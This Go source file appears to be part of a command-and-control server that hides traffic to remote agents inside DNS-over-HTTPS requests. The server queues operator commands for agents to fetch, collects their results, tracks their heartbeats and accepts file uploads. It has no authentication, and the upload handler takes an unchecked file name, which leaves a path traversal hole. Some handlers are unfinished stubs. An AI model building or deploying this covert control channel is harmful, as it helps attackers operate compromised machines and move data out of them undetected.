package protocols

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type DNSOverHTTPSProtocol struct {
	config   BaseProtocolConfig
	commands struct {
		sync.Mutex
		queue []string
	}
	results struct {
		sync.Mutex
		queue []CommandResult
	}
	agents struct {
		sync.Mutex
		list map[string]*Agent
	}
	listeners struct {
		sync.Mutex
		list map[string]*Listener
	}
}

func NewDNSOverHTTPSProtocol(config BaseProtocolConfig) *DNSOverHTTPSProtocol {
	return &DNSOverHTTPSProtocol{
		config: config,
		agents: struct {
			sync.Mutex
			list map[string]*Agent
		}{list: make(map[string]*Agent)},
		listeners: struct {
			sync.Mutex
			list map[string]*Listener
		}{list: make(map[string]*Listener)},
	}
}

func (p *DNSOverHTTPSProtocol) Initialize() error {
	return os.MkdirAll(p.config.UploadDir, 0755)
}

func (p *DNSOverHTTPSProtocol) HandleCommand(cmd string) error {
	p.commands.Lock()
	p.commands.queue = append(p.commands.queue, cmd)
	p.commands.Unlock()
	return nil
}

func (p *DNSOverHTTPSProtocol) HandleFileUpload(filename string, fileData io.Reader) error {
	filepath := filepath.Join(p.config.UploadDir, filename)
	file, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(file, fileData)
	return err
}

func (p *DNSOverHTTPSProtocol) HandleFileDownload(filename string) (io.Reader, error) {
	return os.Open(filepath.Join(p.config.UploadDir, filename))
}

func (p *DNSOverHTTPSProtocol) HandleAgentHeartbeat(agentData []byte) error {
	var agent Agent
	if err := json.Unmarshal(agentData, &agent); err != nil {
		return err
	}

	p.agents.Lock()
	agent.LastSeen = time.Now()
	p.agents.list[agent.ID] = &agent
	p.agents.Unlock()

	return nil
}

// Add HTTP handler for agent heartbeat
func (p *DNSOverHTTPSProtocol) handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	if err := p.HandleAgentHeartbeat(body); err != nil {
		http.Error(w, "Error processing agent data", http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":      "connected",
		"server_time": time.Now().Format(time.RFC3339),
	})
}

// GetRoutes returns the HTTP routes for DNS over HTTPS protocol
func (p *DNSOverHTTPSProtocol) GetRoutes() map[string]http.HandlerFunc {
	return map[string]http.HandlerFunc{
		"/dns-query":       p.handleDNSQuery,
		"/files/upload":    p.handleFileUpload,
		"/files/list":      p.handleListFiles,
		"/agent/heartbeat": p.handleAgentHeartbeat,
		"/agent/list":      p.handleListAgents,
	}
}

// handleDNSQuery handles DNS queries which contain encoded command/data
func (p *DNSOverHTTPSProtocol) handleDNSQuery(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var dnsMessage string
	if r.Method == http.MethodGet {
		dnsMessage = r.URL.Query().Get("dns")
	} else {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body", http.StatusBadRequest)
			return
		}
		dnsMessage = string(body)
	}

	// Decode base64 DNS message
	decodedData, err := base64.RawURLEncoding.DecodeString(dnsMessage)
	if err != nil {
		http.Error(w, "Invalid DNS message", http.StatusBadRequest)
		return
	}

	// Parse the message type from the first byte
	if len(decodedData) == 0 {
		http.Error(w, "Empty DNS message", http.StatusBadRequest)
		return
	}

	messageType := decodedData[0]
	payload := decodedData[1:]

	switch messageType {
	case 0x01: // Heartbeat
		if err := p.HandleAgentHeartbeat(payload); err != nil {
			http.Error(w, "Error processing heartbeat", http.StatusBadRequest)
			return
		}
		p.sendDNSResponse(w, []byte{0x01}) // ACK

	case 0x02: // Command request
		p.commands.Lock()
		var response []byte
		if len(p.commands.queue) > 0 {
			cmd := p.commands.queue[0]
			p.commands.queue = p.commands.queue[1:]
			response = append([]byte{0x02}, []byte(cmd)...)
		} else {
			response = []byte{0x00} // No command available
		}
		p.commands.Unlock()
		p.sendDNSResponse(w, response)

	case 0x03: // Command result
		result := CommandResult{
			Command:   string(payload),
			Timestamp: time.Now().Format(time.RFC3339),
		}
		p.results.Lock()
		p.results.queue = append(p.results.queue, result)
		p.results.Unlock()
		p.sendDNSResponse(w, []byte{0x03}) // ACK

	case 0x04: // File upload start
		filename := string(payload)
		if strings.Contains(filename, "..") {
			http.Error(w, "Invalid filename", http.StatusBadRequest)
			return
		}
		p.sendDNSResponse(w, []byte{0x04}) // Ready for data

	case 0x05: // File upload data
		// Handle file data chunks
		// This is simplified - real implementation would need to handle
		// proper file reassembly from chunks
		p.sendDNSResponse(w, []byte{0x05}) // ACK chunk

	default:
		http.Error(w, "Unknown message type", http.StatusBadRequest)
		return
	}
}

func (p *DNSOverHTTPSProtocol) sendDNSResponse(w http.ResponseWriter, data []byte) {
	w.Header().Set("Content-Type", "application/dns-message")
	encoded := base64.RawURLEncoding.EncodeToString(data)
	w.Write([]byte(encoded))
}

func (p *DNSOverHTTPSProtocol) handleFileUpload(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	filename := r.Header.Get("X-Filename")
	if filename == "" {
		http.Error(w, "Missing X-Filename header", http.StatusBadRequest)
		return
	}

	if err := p.HandleFileUpload(filename, r.Body); err != nil {
		log.Printf("Error handling file upload: %v", err)
		http.Error(w, "Failed to handle file upload", http.StatusInternalServerError)
		return
	}
}

func (p *DNSOverHTTPSProtocol) handleListFiles(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	files, err := os.ReadDir(p.config.UploadDir)
	if err != nil {
		http.Error(w, "Failed to list files", http.StatusInternalServerError)
		return
	}

	var fileList []map[string]interface{}
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		fileList = append(fileList, map[string]interface{}{
			"name":     file.Name(),
			"size":     info.Size(),
			"modified": info.ModTime().Format(time.RFC3339),
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(fileList)
}

func (p *DNSOverHTTPSProtocol) handleListAgents(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	p.agents.Lock()
	defer p.agents.Unlock()

	// Clean up stale agents (not seen in last 5 minutes)
	for id, agent := range p.agents.list {
		if time.Since(agent.LastSeen) > 5*time.Minute {
			delete(p.agents.list, id)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(p.agents.list)
}

// Keep this method for internal use even though we're not exposing it via HTTP
func (p *DNSOverHTTPSProtocol) handleListeners(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	w.Header().Set("Content-Type", "application/json")

	p.listeners.Lock()
	defer p.listeners.Unlock()

	// Convert map to slice for JSON response
	listenersList := make([]*Listener, 0, len(p.listeners.list))
	for _, listener := range p.listeners.list {
		listenersList = append(listenersList, listener)
	}

	if err := json.NewEncoder(w).Encode(listenersList); err != nil {
		http.Error(w, "Error encoding listeners", http.StatusInternalServerError)
		return
	}
}

// DNS message types
const (
	DNSTypeHeartbeat     byte = 0x01
	DNSTypeCommand       byte = 0x02
	DNSTypeCommandResult byte = 0x03
	DNSTypeFileStart     byte = 0x04
	DNSTypeFileData      byte = 0x05
)

// DNSMessageHandler handles incoming DNS-over-HTTPS connections
type DNSMessageHandler struct {
	listener *Listener
}

// NewDNSMessageHandler creates a new DNS message handler
func NewDNSMessageHandler(listener *Listener) *DNSMessageHandler {
	return &DNSMessageHandler{
		listener: listener,
	}
}

// HandleDNSMessage processes an incoming DNS message
func (h *DNSMessageHandler) HandleDNSMessage(data []byte) ([]byte, error) {
	if len(data) < 1 {
		return nil, fmt.Errorf("empty DNS message")
	}

	messageType := data[0]
	payload := data[1:]

	switch messageType {
	case DNSTypeHeartbeat:
		return h.handleHeartbeat(payload)
	case DNSTypeCommand:
		return h.handleCommandRequest(payload)
	case DNSTypeCommandResult:
		return h.handleCommandResult(payload)
	case DNSTypeFileStart:
		return h.handleFileStart(payload)
	case DNSTypeFileData:
		return h.handleFileData(payload)
	default:
		return nil, fmt.Errorf("unknown message type: %d", messageType)
	}
}

func (h *DNSMessageHandler) handleHeartbeat(payload []byte) ([]byte, error) {
	var agent Agent
	if err := json.Unmarshal(payload, &agent); err != nil {
		return nil, fmt.Errorf("invalid heartbeat data: %v", err)
	}

	h.listener.mu.Lock()
	h.listener.Stats.BytesReceived += int64(len(payload))
	h.listener.mu.Unlock()

	// Send acknowledgment
	response := []byte{DNSTypeHeartbeat}
	return response, nil
}

func (h *DNSMessageHandler) handleCommandRequest(payload []byte) ([]byte, error) {
	// TODO: Get command from queue and send to agent
	response := []byte{DNSTypeCommand, 0x00} // No command available
	return response, nil
}

func (h *DNSMessageHandler) handleCommandResult(payload []byte) ([]byte, error) {
	// Use the result variable or remove it
	// Comment out or use the result variable
	_ = CommandResult{
		Command:   string(payload),
		Output:    "",
		Timestamp: "",
	}

	h.listener.mu.Lock()
	h.listener.Stats.BytesReceived += int64(len(payload))
	h.listener.mu.Unlock()

	// Send acknowledgment
	response := []byte{DNSTypeCommandResult}
	return response, nil
}

func (h *DNSMessageHandler) handleFileStart(payload []byte) ([]byte, error) {
	// Use the filename variable or remove it
	// Just log it for now
	filename := string(payload)
	log.Printf("File upload started: %s", filename)

	// TODO: Initialize file upload session
	response := []byte{DNSTypeFileStart}
	return response, nil
}

func (h *DNSMessageHandler) handleFileData(payload []byte) ([]byte, error) {
	// TODO: Handle file data chunk
	response := []byte{DNSTypeFileData}
	return response, nil
}
